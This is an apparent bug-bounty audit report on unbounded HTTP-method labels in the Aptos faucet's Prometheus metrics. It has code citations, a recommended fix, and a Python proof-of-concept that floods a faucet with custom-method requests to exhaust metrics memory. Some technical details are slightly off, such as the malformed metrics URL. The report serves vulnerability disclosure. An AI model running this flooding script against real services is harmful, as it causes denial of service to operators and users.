# Audit Report

## Title
Prometheus Time Series Explosion via Unbounded HTTP Method Label in Aptos Faucet Metrics

## Summary
The Aptos faucet metrics middleware records HTTP methods in Prometheus metrics without validation or sanitization, allowing an attacker to cause time series explosion by sending requests with arbitrary custom HTTP method strings. This leads to memory exhaustion in Prometheus and potential denial of service of the faucet service.

## Finding Description

The faucet middleware captures the raw HTTP method string from incoming requests and uses it as a Prometheus metric label without any validation, normalization, or cardinality protection. [1](#0-0) 

The captured method is then used directly as a label value in the `HISTOGRAM` metric: [2](#0-1) 

The `HISTOGRAM` metric is defined with three labels including `method`: [3](#0-2) 

**Attack Path:**

1. Attacker sends HTTP requests to any faucet endpoint with unique custom method strings (e.g., "M0001", "M0002", ..., "M9999")
2. The middleware captures each unique method via `request.method().to_string()`
3. Each unique method creates a new time series: `aptos_tap_requests{method="M0001", operation_id="...", status="405"}`
4. With ~6 operation_ids and ~30 status codes, an attacker creating 10,000 unique methods generates: 10,000 × 6 × 30 = 1,800,000 time series
5. Prometheus memory consumption grows proportionally, eventually causing OOM

The middleware runs before any method validation due to its position in the middleware chain: [4](#0-3) 

The `.around(middleware_log)` wrapper ensures the middleware executes before CORS validation or route matching, so custom methods are captured even if the request is later rejected.

**Contrast with Secure Implementation:**

The Aptos codebase demonstrates awareness of this attack pattern. The keyless pepper service explicitly protects against cardinality explosion by normalizing unknown request paths: [5](#0-4) 

The faucet middleware lacks equivalent protection for HTTP methods.

## Impact Explanation

This is a **High severity** vulnerability per Aptos bug bounty criteria:

- **Validator node slowdowns**: If the faucet service shares Prometheus infrastructure with validators, time series explosion degrades monitoring performance
- **API crashes**: Memory exhaustion in Prometheus causes the metrics endpoint to fail, which may trigger faucet service health check failures and crashes
- **Denial of Service**: The faucet becomes unavailable, preventing legitimate users from obtaining testnet tokens
- **Monitoring system failure**: Prometheus becomes unable to scrape metrics, blinding operators to system health

The attack is amplified because Prometheus stores time series in memory and on disk. Even after stopping the attack, historical time series data persists until retention periods expire.

## Likelihood Explanation

**Very High Likelihood:**

- **No authentication required**: The faucet is a public service accepting unauthenticated HTTP requests
- **Trivial to execute**: Attack requires only sending HTTP requests with custom method strings using standard tools (curl, custom scripts)
- **No rate limiting on method diversity**: While the faucet may rate-limit by IP or request count, there's no protection against method cardinality
- **Immediate impact**: Each request with a unique method instantly creates new time series
- **Low attacker cost**: A single machine can generate thousands of unique methods in minutes

## Recommendation

Implement cardinality protection by normalizing HTTP methods to a bounded set, following the pattern used in the pepper service:

```rust
// In crates/aptos-faucet/core/src/middleware/log.rs

// Add at module level:
const ALLOWED_METHODS: &[&str] = &["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"];
const INVALID_METHOD: &str = "INVALID_METHOD";

// Modify line 32:
method: normalize_method(request.method()),

// Add helper function:
fn normalize_method(method: &Method) -> String {
    let method_str = method.as_str();
    if ALLOWED_METHODS.contains(&method_str) {
        method_str.to_string()
    } else {
        INVALID_METHOD.to_string()
    }
}
```

Alternative approach: Use poem's standard Method enum values only:

```rust
// Modify HttpRequestLog struct:
method: Method, // Store the enum, not String

// Modify line 135:
self.request_log.method.as_str(),

// This automatically limits to poem's built-in Method enum variants
```

**Additional hardening:**
- Monitor Prometheus cardinality metrics and alert on unusual growth
- Configure Prometheus with `--storage.tsdb.max-exemplars` and `--storage.tsdb.max-samples-per-query` limits
- Implement metric relabeling to drop time series with unusual method values

## Proof of Concept

```python
#!/usr/bin/env python3
"""
Proof of Concept: Aptos Faucet Time Series Explosion
Demonstrates cardinality explosion via custom HTTP methods
"""

import requests
import time

FAUCET_URL = "http://localhost:8081"  # Adjust to actual faucet URL

def attack_time_series_explosion(num_unique_methods=1000):
    """
    Send requests with unique HTTP method strings to cause time series explosion.
    """
    print(f"[*] Starting time series explosion attack with {num_unique_methods} unique methods")
    
    for i in range(num_unique_methods):
        # Generate unique method string
        custom_method = f"ATTACK_{i:05d}"
        
        try:
            # Send request with custom method using requests.request()
            # The underlying urllib3/httplib accepts arbitrary method strings
            response = requests.request(
                method=custom_method,
                url=f"{FAUCET_URL}/fund",
                timeout=5
            )
            
            if i % 100 == 0:
                print(f"[+] Sent {i} unique methods. Latest: {custom_method}, Status: {response.status_code}")
                
        except Exception as e:
            if i % 100 == 0:
                print(f"[!] Request {i} failed: {e}")
    
    print(f"\n[*] Attack complete. Check Prometheus metrics at {FAUCET_URL}:9101/metrics")
    print(f"[*] Look for 'aptos_tap_requests' with method labels like 'ATTACK_00000', 'ATTACK_00001', etc.")
    print(f"[*] Expected time series created: ~{num_unique_methods * 6 * 30} (methods × operation_ids × status_codes)")

def verify_metrics():
    """
    Query the metrics endpoint to verify time series explosion
    """
    try:
        # Metrics server typically runs on port 9101
        metrics_response = requests.get(f"{FAUCET_URL}:9101/metrics", timeout=10)
        
        # Count unique aptos_tap_requests time series
        lines = metrics_response.text.split('\n')
        tap_request_series = [l for l in lines if 'aptos_tap_requests{' in l and 'method="ATTACK_' in l]
        
        print(f"\n[*] Found {len(tap_request_series)} malicious time series in Prometheus metrics")
        print(f"[*] Sample entries:")
        for line in tap_request_series[:5]:
            print(f"    {line[:120]}...")
            
    except Exception as e:
        print(f"[!] Could not verify metrics: {e}")

if __name__ == "__main__":
    attack_time_series_explosion(num_unique_methods=1000)
    time.sleep(2)  # Wait for metrics to be scraped
    verify_metrics()
```

**Expected Result:** After running the PoC, querying the faucet's metrics endpoint will show thousands of unique `aptos_tap_requests` time series with method labels like "ATTACK_00000", "ATTACK_00001", etc. Prometheus memory usage will increase proportionally, and with sufficient unique methods, the metrics service will experience memory pressure or OOM.

## Notes

This vulnerability exists despite CORS configuration limiting methods to GET and POST, because:
1. The metrics middleware executes before CORS validation
2. CORS primarily governs browser cross-origin requests, not direct API calls
3. Even rejected requests (405 Method Not Allowed) have their methods recorded in metrics

The vulnerability is amplified by the histogram metric type, which creates multiple time series per unique label combination (one per bucket plus sum/count). The actual cardinality explosion is: `unique_methods × operation_ids × status_codes × histogram_buckets`.

### Citations

**File:** crates/aptos-faucet/core/src/middleware/log.rs (L30-33)
```rust
    let request_log = HttpRequestLog {
        source_ip,
        method: request.method().to_string(),
        path: request.uri().path().to_string(),
```

**File:** crates/aptos-faucet/core/src/middleware/log.rs (L133-139)
```rust
                HISTOGRAM
                    .with_label_values(&[
                        self.request_log.method.as_str(),
                        response_log.operation_id,
                        response_log.response_status.to_string().as_str(),
                    ])
                    .observe(response_log.elapsed.as_secs_f64());
```

**File:** crates/aptos-faucet/core/src/middleware/metrics.rs (L11-18)
```rust
pub static HISTOGRAM: Lazy<HistogramVec> = Lazy::new(|| {
    register_histogram_vec!(
        "aptos_tap_requests",
        "Tap requests latency grouped by method, operation_id and status.",
        &["method", "operation_id", "status"]
    )
    .unwrap()
});
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L207-219)
```rust
        let api_server_future = Server::new_with_acceptor(TcpAcceptor::from_tokio(listener)?).run(
            Route::new()
                .nest(
                    &self.server_config.api_path_base,
                    Route::new()
                        .nest("", api_service)
                        .catch_all_error(convert_error),
                )
                .at("/spec.json", spec_json)
                .at("/spec.yaml", spec_yaml)
                .at("/mint", poem::post(mint.data(fund_api_components)))
                .with(cors)
                .around(middleware_log),
```

**File:** keyless/pepper/service/src/metrics.rs (L155-161)
```rust
    // Determine the request endpoint to use in the metrics (i.e., replace
    // invalid paths with a fixed label to avoid high cardinality).
    let request_endpoint = if is_known_path(request_endpoint) {
        request_endpoint
    } else {
        INVALID_PATH
    };
```
